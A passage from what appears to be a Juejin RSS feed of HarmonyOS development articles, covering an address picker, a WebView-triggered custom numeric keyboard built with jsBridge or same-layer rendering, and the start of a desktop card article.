reset-size6 size3 mtight"><span class="mord mathnormal mtight">c</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0278em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7519em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">:</span></span></span></span></span>r('app.color.custom_address_picker_font_color_gray'))
.constraintSize({ maxWidth: 'calc(33%)' })
.textOverflow({ overflow: TextOverflow.Ellipsis })
.maxLines(Constants.SIZE_ONE)
.onClick(() =&gt; {
// 使用changeIndex控制省市区列表TabContent切换
this.controller.changeIndex(params.index);
})
.id(params.index.toString())
.onAreaChange((oldValue: Area, newValue: Area) =&gt; {
// 使用组件区域变化回调onAreaChange获取选择的省市区Text组件宽度，存入textInfos数组，用于后续计算选择省市区名后下方下滑线动画水平偏移量leftMargin
// 组件区域变化时获取当前Text的宽度newValue.width和x轴相对位置newValue.position.x
this.textInfos[params.index] = [newValue.position.x as number, newValue.width as number];
if (this.currentIndex === params.index &amp;&amp; params.index === AddressType.Province) {
// 计算选择的省市区名下方的下滑线偏移量
this.leftMargin = (this.textInfos[this.currentIndex][1] - Constants.DIVIDER_WIDTH) / 2;
}
})</p>
</li>
<li>
<p>在选择完区名后，使用JSON.parse(JSON.stringify(xxx))深拷贝选择的省市区数据，用于后续操作中需要加载上一次选择的完整省市区数据。</p>
<p>List() {
ForEach(this.regionList, (item: CommonAddressList) =&gt; {
ListItem() {
this.areaNameItem(AddressType.Region, item)
}.onClick(() =&gt; {
// 记录选择的区信息
this.currentSelectInfo.regionId = item.code;
this.currentSelectInfo.region = item.name;
this.provinceCityRegion =
this.currentSelectInfo.province + this.currentSelectInfo.city + this.currentSelectInfo.region;
// 选择区后，退出地址选择半模态弹窗页面
this.isShow = false;
// 将当前选中省市区信息保存到lastSelectInfo
this.lastSelectInfo.provinceId = this.currentSelectInfo.provinceId;
this.lastSelectInfo.province = this.currentSelectInfo.province;
this.lastSelectInfo.cityId = this.currentSelectInfo.cityId;
this.lastSelectInfo.city = this.currentSelectInfo.city;
this.lastSelectInfo.regionId = this.currentSelectInfo.regionId;
this.lastSelectInfo.region = this.currentSelectInfo.region;
// TODO 知识点：在选择完区名后，使用JSON.parse(JSON.stringify(xxx))深拷贝选择的省市区数据，用于后续操作中需要加载上一次选择的完整省市区数据
// 深拷贝保存到相应的变量中
this.lastCityList = JSON.parse(JSON.stringify(this.cityList));
this.lastRegionList = JSON.parse(JSON.stringify(this.regionList));
this.address = JSON.parse(JSON.stringify(this.lastSelectInfo));
})
}, (item: CommonAddressList) =&gt; JSON.stringify(item))
}</p>
</li>
</ol>
<h2 data-id="heading-3">总结</h2>
<p>本示例中如果当前点击选择的省或者市与之前选择一样，则跳过省、市数据获取，直接调用changeIndex(AddressType.City)切换到下一级地区列表，减少冗余查询以提升性能。</p>
<h4 data-id="heading-4">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-5">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6aab8df1eb046b69f3ba6cb0cd870f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767622805&amp;x-signature=X57sWKkODkQ8AEru5hu5Jpclmqs%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：Webview拉起自定义键盘]]></title>    <link>https://juejin.cn/post/7589126217250914345</link>    <guid>https://juejin.cn/post/7589126217250914345</guid>    <pubDate>2025-12-29T14:26:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217250914345" data-draft-id="7589126217250897961" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：Webview拉起自定义键盘"/> <meta itemprop="keywords" content="HarmonyOS,程序员,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:26:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：Webview拉起自定义键盘
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:26:57.000Z" title="Mon Dec 29 2025 14:26:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">场景描述</h3>
<p>在特殊的H5场景下需要应用拉起自定义键盘进行输入。</p>
<p>场景一：使用jsBridge拉起自定义弹窗写自定义键盘，再通过jsBridge传参实现输入。</p>
<p>场景二：使用web的同层渲染将原生textInput组件渲染到页面上。</p>
<h3 data-id="heading-1">方案描述</h3>
<p>通过注册一个js代理对象被web的registerJavaScriptProxy方法调用拉起CustomDialog，在CustomDialog上放置一个customkeyboard </p>
<p>场景一：通过jsBridge拉起自定义弹窗，在自定义弹窗上放置自定义键盘，例如需要输入密码时的安全键盘。 </p>
<h4 data-id="heading-2">效果图</h4>
<p><img alt="" src="" loading="lazy"/></p>
<h3 data-id="heading-3">方案 </h3>
<p>通过注册一个js代理对象被web的registJavaScriptProxy方法调用拉起CustomDialog，在CustomDialog上放置一个自定义键盘组件，通过在H5上input标签的readonly属性和注册的js方法changeNumbers实现在原生端输入数字传到H5上，他们之间通过@Link装饰器绑定的变量进行传值，所以点击删除输入的内容也是可以在H5上实现的。 </p>
<h4 data-id="heading-4">核心代码</h4>
<p>通过javaScriptProxy方法拉起自定义弹窗，在H5上的input标签绑定一个onclick事件，当点击输入框后会调用从原生注册过来的js代理方法openWindow。</p>
<pre><code class="hljs language-typescript" lang="typescript">&lt;input <span class="hljs-keyword">type</span>=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"number_info"</span> <span class="hljs-keyword">readonly</span> onclick=<span class="hljs-string">"openWindow()"</span> value=<span class="hljs-string">""</span> style=<span class="hljs-string">"width: 500px;height: 100px;font-size:50px;border:1px solid # f00;"</span>&gt;
 
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
 
<span class="hljs-keyword">function</span> <span class="hljs-title function_">openWindow</span>(<span class="hljs-params"/>) {
 
<span class="hljs-keyword">let</span> value = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">"number_info"</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span>;
 
<span class="hljs-variable language_">window</span>.<span class="hljs-property">myJsb</span>.<span class="hljs-title function_">openDialog</span>(value)
 
}
 
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>当H5上openWindow方法被调用后会通过jsBridge调用以下两个js代理方法打开自定义弹窗。</p>
<pre><code class="hljs language-kotlin" lang="kotlin">jsbObject: JsbObject = {
 
openDialog: (value: string) =&gt; {
 
<span class="hljs-keyword">this</span>.showDialog(<span class="hljs-keyword">this</span>, value);
 
}
 
}
 
showDialog(context: <span class="hljs-keyword">object</span>, value: string) {
 
<span class="hljs-comment">// 把自定义弹窗调出来</span>
 
<span class="hljs-keyword">this</span>.currentData = value;
 
<span class="hljs-keyword">this</span>.dialogController.<span class="hljs-keyword">open</span>()
 
}
 
 
 
Web({ src: <span class="hljs-string">"resource://rawfile/web_test.html"</span>, controller: <span class="hljs-keyword">this</span>.webviewController })
 
.javaScriptAccess(<span class="hljs-literal">true</span>)
 
.javaScriptProxy({
 
name: <span class="hljs-string">"myJsb"</span>,
 
<span class="hljs-keyword">object</span>: <span class="hljs-keyword">this</span>.jsbObject,
 
methodList: [<span class="hljs-string">"openDialog"</span>],
 
controller: <span class="hljs-keyword">this</span>.webviewController
 
}
</code></pre>
<p>将自定义键盘放置在自定义弹窗上。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@CustomDialog</span>
 
struct CustomDialogExample {
 
<span class="hljs-keyword">@Link</span> <span class="hljs-attribute">currentData</span>: string
 
<span class="hljs-attribute">dialogControllerTwo</span>: CustomDialogController | null = new CustomDialogController({
 
builder: <span class="hljs-built_in">CustomDialogExample</span>({ currentData: <span class="hljs-variable">$currentData</span> }),
 
alignment: DialogAlignment.Bottom,
 
offset: { dx: <span class="hljs-number">0</span>, dy: -<span class="hljs-number">25</span> }
 
})
 
controller?: CustomDialogController
 
 
 
<span class="hljs-built_in">build</span>() {
 
<span class="hljs-built_in">Column</span>() {
 
<span class="hljs-selector-tag">Button</span>('x')<span class="hljs-selector-class">.onClick</span>(() =&gt; {
 
<span class="hljs-comment">// 关闭自定义键盘</span>
 
if (this.controller != undefined) {
 
this<span class="hljs-selector-class">.controller</span><span class="hljs-selector-class">.close</span>()
 
}
 
})
 
<span class="hljs-attribute">Grid</span>() {
 
<span class="hljs-built_in">ForEach</span>([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, '*', <span class="hljs-number">0</span>, '删除'], (item: number | string) =&gt; {
 
<span class="hljs-built_in">GridItem</span>() {
 
<span class="hljs-selector-tag">Button</span>(item + "")
 
<span class="hljs-selector-class">.width</span>(<span class="hljs-number">110</span>)<span class="hljs-selector-class">.onClick</span>(() =&gt; {
 
if (item == '删除') {
 
if (this.currentData.length &gt; <span class="hljs-number">0</span>) {
 
this<span class="hljs-selector-class">.currentData</span> = this<span class="hljs-selector-class">.currentData</span><span class="hljs-selector-class">.substring</span>(<span class="hljs-number">0</span>, this.currentData.length - <span class="hljs-number">1</span>);
 
}
 
} else {
 
this<span class="hljs-selector-class">.currentData</span> += item
 
}
 
})
 
}
 
})
 
}<span class="hljs-selector-class">.maxCount</span>(<span class="hljs-number">3</span>)<span class="hljs-selector-class">.columnsGap</span>(<span class="hljs-number">10</span>)<span class="hljs-selector-class">.rowsGap</span>(<span class="hljs-number">10</span>)<span class="hljs-selector-class">.padding</span>(<span class="hljs-number">5</span>)
 
}<span class="hljs-selector-class">.backgroundColor</span>(Color.Gray)
 
}
 
}
</code></pre>
<p>在自定义键盘上输入内容的时候会调用onChangeInputValue方法，通过里面的runJavaScript调用H5上的js方法changeNumber传值到H5的输入框中。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title function_">onChangeInputValue</span>(<span class="hljs-params">stateName: <span class="hljs-built_in">string</span></span>){
 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'this.currentData:'</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentData</span>)
 
<span class="hljs-variable language_">this</span>.<span class="hljs-property">webviewController</span>.<span class="hljs-title function_">runJavaScript</span>(<span class="hljs-string">'changeNumber("'</span>+ <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentData</span> +<span class="hljs-string">'")'</span>)
 
.<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params">result</span>) =&gt;</span> {
 
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'result: '</span> + result);
 
})
 
}
 
 
&lt;&lt;input <span class="hljs-keyword">type</span>=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"number_info"</span> <span class="hljs-keyword">readonly</span> onclick=<span class="hljs-string">"openWindow()"</span> value=<span class="hljs-string">""</span> style=<span class="hljs-string">"width: 500px;height: 100px;font-size:50px;border:1px solid # f00;"</span> /&gt;
 
<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
 
<span class="hljs-keyword">function</span> <span class="hljs-title function_">changeNumber</span>(<span class="hljs-params">value</span>){
 
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">"number_info"</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = value;
 
}
 
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span>
</code></pre>
<p>**场景二：**<strong>通过同层渲染渲染一个原生的自定义键盘</strong></p>
<p><strong>效果图</strong></p>
<p><img alt="" src="" loading="lazy"/></p>
<h3 data-id="heading-5">方案</h3>
<p>整体实现效果为：通过web的同层渲染功能实现将原生TextInput组件渲染到H5需要使用自定义键盘的页面中，这样就可以实现在H5拉起自定义键盘，并且使用它的全部功能。</p>
<h4 data-id="heading-6">核心代码</h4>
<ol>
<li>
<p>创建一个自定义键盘并绑定到原生textInput组件上。</p>
<p>@Component</p>
<p>struct ButtonComponent {</p>
<p>controller1: TextInputController = new TextInputController()</p>
<p>@State inputValue: string = ""</p>
<p>// 自定义键盘组件</p>
<p>@Builder</p>
<p>CustomKeyboardBuilder() {</p>
<p>Column() {</p>
<p>Button('x').onClick(() =&gt; {</p>
<p>// 关闭自定义键盘</p>
<p>this.controller1.stopEditing()</p>
<p>})</p>
<p>Grid() {</p>
<p>ForEach([1, 2, 3, 4, 5, 6, 7, 8, 9, '*', 0, '# '], (item: number | string) =&gt; {</p>
<p>GridItem() {</p>
<p>Button(item + "")</p>
<p>.width(110).onClick(() =&gt; {</p>
<p>this.inputValue += item</p>
<p>})</p>
<p>}</p>
<p>})</p>
<p>}.maxCount(3).columnsGap(10).rowsGap(10).padding(5)</p>
<p>}.backgroundColor(Color.Pink)</p>
<p>}</p>
<p>@ObjectLink params: Params</p>
<p>@State bkColor: Color = Color.Red</p>
<p>@State outSetValueTwo: number = 40</p>
<p>@State outSetValueOne: number = 40</p>
<p>@State tipsValue: number = 40</p>
<p>controller: web_webview.WebviewController = new web_webview.WebviewController();</p>
<p>build() {</p>
<p>Column() {</p>
<p>TextInput({ controller: this.controller1, text: this.inputValue })// 绑定自定义键盘</p>
<p>.customKeyboard(this.CustomKeyboardBuilder()).margin(10).border({ width: 1 })</p>
<p>}</p>
<p>.width(this.params.width)</p>
<p>.height(this.params.height)</p>
<p>}</p>
<p>}</p>
</li>
</ol>
<p>将原生textInput组件通过web同层渲染功能渲染到H5上的embed标签上。</p>
<h4 data-id="heading-7">如果您想系统深入地学习 HarmonyOS 开发或想考取HarmonyOS认证证书，欢迎加入华为开发者学堂：</h4>
<h3 data-id="heading-8">请点击→： <a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.huawei.com%2Fconsumer%2Fcn%2Ftraining%2FclassDetail%2Fd0d15d9039414a8fad9f99ac4a3f5096%3Ftype%3D1%253Fha_source%253Dhmosclass%26ha_sourceId%3D89000248" target="_blank" title="https://developer.huawei.com/consumer/cn/training/classDetail/d0d15d9039414a8fad9f99ac4a3f5096?type=1%3Fha_source%3Dhmosclass&amp;ha_sourceId=89000248" ref="nofollow noopener noreferrer">HarmonyOS官方认证培训</a></h3>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c3e2762caa324b73be4a3ed3d9c74740~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6bm_5Lq65oib:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767623216&amp;x-signature=CxNXEKzzJBXBLoyncdzcJCVwFgI%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[HarmonyOS应用开发：桌面卡片实现]]></title>    <link>https://juejin.cn/post/7589126217250930729</link>    <guid>https://juejin.cn/post/7589126217250930729</guid>    <pubDate>2025-12-29T14:29:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217250930729" data-draft-id="7589082912588873771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="HarmonyOS应用开发：桌面卡片实现"/> <meta itemprop="keywords" content="HarmonyOS,程序员,Android"/> <meta itemprop="datePublished" content="2025-12-29T14:29:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="鹿人戛"/> <meta itemprop="url" content="https://juejin.cn/user/4309685005226376"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            HarmonyOS应用开发：桌面卡片实现
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4309685005226376/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    鹿人戛
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T14:29:36.000Z" title="Mon Dec 29 2025 14:29:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 